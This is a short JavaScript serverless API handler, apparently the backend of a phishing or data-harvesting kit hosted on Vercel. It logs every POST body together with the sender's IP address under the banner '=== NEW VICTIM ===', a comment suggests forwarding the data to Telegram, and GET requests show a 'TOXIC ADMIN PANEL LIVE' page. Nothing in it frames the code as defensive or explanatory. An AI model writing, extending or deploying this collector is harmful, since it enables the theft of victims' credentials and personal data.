export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    const logEntry = JSON.stringify({
      timestamp: new Date().toISOString(),
      ...data,
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
    }, null, 2);

    console.log("=== NEW VICTIM ===\n" + logEntry);

    // Optional: Telegram backup from server side bhi
    // fetch telegram here if you want

    res.status(200).json({ok: true});
  } else {
    res.send(`<h1>TOXIC ADMIN PANEL LIVE</h1><p>Check Vercel Function Logs</p>`);
  }
}
